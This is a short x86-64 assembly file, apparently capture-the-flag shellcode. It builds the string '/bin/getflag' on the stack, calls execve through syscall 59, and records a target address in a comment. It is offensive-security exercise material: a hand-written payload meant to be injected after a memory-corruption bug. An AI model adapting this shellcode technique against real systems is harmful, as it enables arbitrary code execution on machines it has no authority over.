BITS 64
global _start

;0x400645
section .text

_start: 

push 0 
mov rax, 0x67616c667465672f
push rax
xor rax, rax
mov rax, 0x6e69622f5f5f5f5f
push rax
xor rax, rax 
mov rax, 59 
lea rdi, [rsp+0x4]
mov rsi, 0 
mov rdx, 0 
syscall


	



